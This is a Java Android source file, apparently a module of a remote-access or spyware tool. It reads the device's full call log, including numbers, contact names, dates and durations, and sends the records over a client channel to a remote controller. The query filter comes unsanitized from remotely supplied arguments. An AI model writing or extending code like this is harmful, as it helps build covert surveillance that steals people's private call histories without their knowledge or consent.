package my.app.Library;

import java.util.ArrayList;

import my.app.client.ClientListener;
import Packet.CallLogPacket;
import Packet.CallPacket;
import android.database.Cursor;
import android.provider.CallLog;

public class CallLogLister {

	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
		final ArrayList<CallPacket> l = new ArrayList<CallPacket>();

		boolean ret = false;
		final String WHERE_CONDITION = new String(args);
		final String SORT_ORDER = "date DESC";
		final String[] column = { "_id", "type", "date", "duration", "number", "name",
			"raw_contact_id" };

		final Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column,
			WHERE_CONDITION, null, SORT_ORDER);

		if (cursor.getCount() != 0) {
			cursor.moveToFirst();

			do
				if (cursor.getColumnCount() != 0) {
					final int id = cursor.getInt(cursor.getColumnIndex("_id"));
					final int type = cursor.getInt(cursor.getColumnIndex("type"));
					final long date = cursor.getLong(cursor.getColumnIndex("date"));
					final long duration = cursor.getLong(cursor.getColumnIndex("duration"));
					final String number = cursor.getString(cursor.getColumnIndex("number"));
					final String name = cursor.getString(cursor.getColumnIndex("name"));
					final int raw_contact_id = cursor.getInt(cursor
						.getColumnIndex("raw_contact_id"));

					l.add(new CallPacket(id, type, date, duration, raw_contact_id, number, name));
				}
			while (cursor.moveToNext());
			ret = true;
		} else
			ret = false;

		c.handleData(channel, new CallLogPacket(l).build());
		return ret;
	}

}
